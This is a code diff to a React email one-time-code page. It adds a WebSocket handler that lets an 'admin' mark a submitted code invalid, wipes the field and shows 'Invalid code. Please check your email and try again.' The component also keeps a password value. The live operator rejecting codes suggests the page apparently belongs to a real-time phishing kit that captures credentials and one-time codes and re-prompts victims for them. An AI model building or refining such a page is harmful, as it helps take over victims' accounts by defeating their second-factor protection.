@@ -1,17 +1,29 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { useWebSocket } from '../context/WebSocketContext';
 import "../styles/email-otp.css";
 
 const EmailOtp = () => {
   const navigate = useNavigate();
-  const { submitForm, isConnected } = useWebSocket();
+  const { submitForm, isConnected, verificationError, clearVerificationError } = useWebSocket();
   const [code, setCode] = useState("");
   const [showError, setShowError] = useState(false);
+  const [showInvalidError, setShowInvalidError] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [password, setPassword] = useState("");
+
+  // Handle verification error from admin
+  useEffect(() => {
+    if (verificationError && verificationError.type === 'email') {
+      setShowInvalidError(true);
+      setIsLoading(false);
+      setIsSubmitted(false);
+      setCode('');
+      clearVerificationError();
+    }
+  }, [verificationError, clearVerificationError]);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -100,7 +112,10 @@ const EmailOtp = () => {
                   inputMode="numeric"
                   type="text"
                   value={code}
-                  onChange={(e) => setCode(e.target.value)}
+                  onChange={(e) => {
+                    setCode(e.target.value);
+                    setShowInvalidError(false);
+                  }}
                   name="authenticator"
                 />
                 <span
@@ -108,6 +123,12 @@ const EmailOtp = () => {
                   style={{ display: showError ? "block" : "none" }}
                 >
                   Entered code is incorrect.
+                </span>
+                <span
+                  className="error mt-0!"
+                  style={{ display: showInvalidError ? "block" : "none", marginTop: "8px" }}
+                >
+                  Invalid code. Please check your email and try again.
                 </span>
               </div>
             </div>
